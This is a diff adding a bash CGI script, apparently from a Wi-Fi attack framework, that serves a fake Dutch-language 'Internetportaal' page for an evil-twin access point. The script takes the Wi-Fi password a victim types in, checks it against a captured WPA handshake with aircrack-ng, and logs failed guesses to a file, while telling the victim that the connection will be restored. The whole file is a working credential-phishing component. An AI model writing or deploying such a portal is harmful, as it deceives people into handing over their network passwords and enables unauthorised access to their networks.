@@ -1,0 +1,55 @@
+#!/usr/bin/env bash
+echo '<!DOCTYPE html>'
+echo '<html>'
+echo -e '\t<head>'
+echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+echo -e '\t\t<title>Internetportaal</title>'
+echo -e '\t\t<link rel="stylesheet" type="text/css" href="portal.css"/>'
+echo -e '\t\t<script type="text/javascript" src="portal.js"></script>'
+echo -e '\t</head>'
+echo -e '\t<body>'
+echo -e '\t\t<div class="content">'
+echo -e '\t\t\t<center><p>'
+
+POST_DATA=$(cat /dev/stdin)
+if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ "${CONTENT_LENGTH}" -gt 0 ]]; then
+  POST_DATA=${POST_DATA#*=}
+  password=${POST_DATA/+/ }
+  password=${password//[*&\/?<>]}
+  password=$(printf '%b' "${password//%/\\x}")
+  password=${password//[*&\/?<>]}
+fi
+
+if [[ "${#password}" -ge 8 ]] && [[ "${#password}" -le 63 ]]; then
+  rm -rf "/usr/share/wef/cache/www/evil_twin_currentpass.txt" > /dev/null 2>&1
+  echo "${password}" > "/usr/share/wef/cache/www/evil_twin_currentpass.txt"
+  if [ "$(timeout 1.5 bash -c "aircrack-ng -a 2 -b XX:XX:XX:XX:XX:XX -w '/usr/share/wef/cache/www/evil_twin_currentpass.txt' '/usr/share/wef/output/XXXXXXXX/XXXXXXXXXX.cap' 2>/dev/null | grep 'KEY FOUND'")" ]; then
+    touch "/usr/share/wef/cache/www/evil_twin_success.txt" > /dev/null 2>&1
+    echo 'Het wachtwoord is correct, de verbinding wordt over enkele ogenblikken hersteld.'
+    et_successful=1
+  else
+    echo "${password}" >> "/usr/share/wef/cache/www/evil_twin_attempts.txt"
+    echo 'Het wachtwoord is onjuist, terugverwezen naar het hoofdscherm'
+    et_successful=0
+  fi
+elif [[ "${#password}" -gt 0 ]] && [[ "${#password}" -lt 8 ]]; then
+  echo 'Fout. Het wachtwoord moet minstens 8 tekens lang zijn. Doorverwijzen naar het hoofdscherm'
+  et_successful=0
+else
+  echo 'Er is een onverwachte fout opgetreden, waardoor wordt teruggegaan naar het hoofdscherm'
+  et_successful=0
+fi
+
+echo -e '\t\t\t</p></center>'
+echo -e '\t\t</div>'
+echo -e '\t</body>'
+echo '</html>'
+
+if [ "${et_successful}" -eq 1 ]; then
+  exit 0
+else
+  echo '<script type="text/javascript">'
+  echo -e '\tsetTimeout("redirect()", 3500);'
+  echo '</script>'
+  exit 1
+fi
